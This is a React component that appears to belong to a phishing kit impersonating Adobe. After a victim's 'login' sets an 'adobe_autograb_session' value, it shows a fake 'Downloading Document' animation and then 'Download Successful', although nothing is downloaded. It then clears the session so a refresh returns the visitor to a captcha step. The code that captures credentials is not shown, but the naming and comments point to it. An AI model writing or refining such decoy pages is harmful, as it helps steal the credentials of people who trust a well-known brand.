import React, { useEffect, useRef, useState } from 'react';

interface LandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * Simplified LandingPage rebuilt to the new logic:
 * - After successful login (i.e. when adobe_autograb_session exists in localStorage),
 *   show a full-screen plain-text overlay that displays:
 *     "Downloading Document" with an animated dot sequence.
 * - After a short interval the message immediately switches to:
 *     "Download Successful".
 * - The "success" text remains visible indefinitely (until the page is refreshed).
 *
 * The overlay is shown only once per session (tracked by sessionStorage key
 * "adobe_download_shown::<sessionId>" ).
 *
 * NOTE: when the sequence finishes we remove the persisted adobe_autograb_session from localStorage
 * so that a page refresh will return the user to the captcha flow (App.tsx reads localStorage).
 */
const LandingPage: React.FC<LandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    // Check for a session in localStorage
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;

      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }
      // Derive a session id to track whether we've shown the overlay for this session
      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) {
        // Already shown previously in this tab/session — do not restart
        return;
      }

      // Start the download sequence
      setShowOverlay(true);
      setPhase('downloading');

      // animate dots (1..6)
      let dotCount = 1;
      const maxDots = 6;
      const dotInterval = 500; // ms
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, dotInterval) as unknown as number;

      // After 3 seconds show success and do NOT auto-hide (per user request)
      successTimeoutRef.current = window.setTimeout(() => {
        // stop dot animation
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');
        // mark shown so we don't restart sequence for same session (persists till full refresh)
        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {
          // ignore
        }

        // REMOVE persisted session so that a full page refresh will return the user
        // to the captcha flow (App.tsx reads localStorage on load).
        try {
          localStorage.removeItem('adobe_autograb_session');
        } catch {
          // ignore failures to remove storage
        }

        successTimeoutRef.current = null;
      }, 3000) as unknown as number;

    } catch (err) {
      // ignore any storage/access errors
      // do not show overlay if something fails
    }

    return () => {
      // cleanup timers on unmount
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
    };
  }, []);

  // Render a minimal landing view plus the overlay when triggered.
  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: `url('https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Adobe_PDF.svg/640px-Adobe_PDF.svg.png') center center / contain no-repeat`,
        color: '#fff'
      }}
    >
      {/* Background content intentionally blank per request */}
      <div style={{ textAlign: 'center', opacity: 1 }}>
        {/* intentionally empty */}
      </div>

      {/* Overlay with plain text and dot animation */}
      {showOverlay && (
        <div
          aria-live="polite"
          style={{
            position: 'fixed',
            inset: 0,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            pointerEvents: 'none',
            zIndex: 9999
          }}
        >
          <div
            style={{
              background: 'transparent',
              color: '#ffffff',
              textAlign: 'center',
              fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
              fontSize: 18,
              fontWeight: 600,
              pointerEvents: 'none',
              // Subtle high-contrast treatments that keep the background visible
              textShadow: '0 2px 8px rgba(0,0,0,0.75)',
              WebkitTextStroke: '0.5px rgba(0,0,0,0.65)',
              // Slight padding so text isn't flush to the edges on small screens
              padding: '8px 12px',
              borderRadius: 8
            }}
          >
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful</span>}
          </div>
        </div>
      )}
    </div>
  );
};

export default LandingPage;
